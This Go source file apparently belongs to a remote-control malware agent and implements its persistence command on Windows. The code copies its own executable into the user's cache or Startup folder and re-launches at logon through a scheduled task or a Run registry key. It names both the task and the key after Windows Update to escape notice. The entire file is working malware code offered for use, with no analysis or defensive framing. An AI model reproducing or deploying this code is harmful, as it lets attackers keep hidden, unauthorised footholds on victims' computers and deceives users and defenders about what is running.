package commands

import (
	. "d3c/agente/helpers"
	"d3c/commons/helpers"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

type Persiste struct {
	Comando string
}

func (instance Persiste) Executar() (resposta string) {

	comandoSeparado := helpers.SeparaComando(instance.Comando)

	if len(comandoSeparado) > 1 {
		switch comandoSeparado[1] {
		case "task":
			if (runtime.GOOS) != "windows" {
				return "Tecnica de persistencia nao suportada para esse OS."
			}
			caminhoDoArquivo := duplicateMe("")
			comando := exec.Command(
				"schtasks",
				"/Create",
				"/SC", "ONLOGON",
				"/TN", "Windows Update Check",
				"/TR", caminhoDoArquivo,
				"/F",
			)

			retorno, err := comando.CombinedOutput()
			if err != nil {
				resposta = err.Error()
				return
			}

			resposta = string(retorno)
		case "startup":
			if (runtime.GOOS) != "windows" {
				return "Tecnica de persistencia nao suportada para esse OS."
			}
			startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
			duplicateMe(startupFolder)
		case "registro":
			caminhoDoArquivo := duplicateMe("")
			chave, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
			if err != nil {
				return "Erro ao acessar a chave de registro para persistencia."
			}
			defer chave.Close()

			err = chave.SetStringValue("WindowsUpdateCheck", caminhoDoArquivo)
			if err != nil {
				return "Erro ao escrever na chave de registro de persistencia."
			}
		default:
			return "Opção de persistência inválida. Escolha entre as opções: task, registro ou startup."
		}
	}

	return resposta
}

func duplicateMe(diretorioDeDestino string) (destinoFinal string) {

	execName := RetornaNomeDoExecutavel()

	if diretorioDeDestino == "" {
		diretorioDeDestino, _ = os.UserCacheDir()
	}

	arquivoDeOrigem, _ := os.Open(os.Args[0])
	defer arquivoDeOrigem.Close()

	destinoFinal = diretorioDeDestino + "\\" + execName
	arquivoDeDestino, _ := os.Create(destinoFinal)
	defer arquivoDeDestino.Close()

	io.Copy(arquivoDeDestino, arquivoDeOrigem)

	return
}
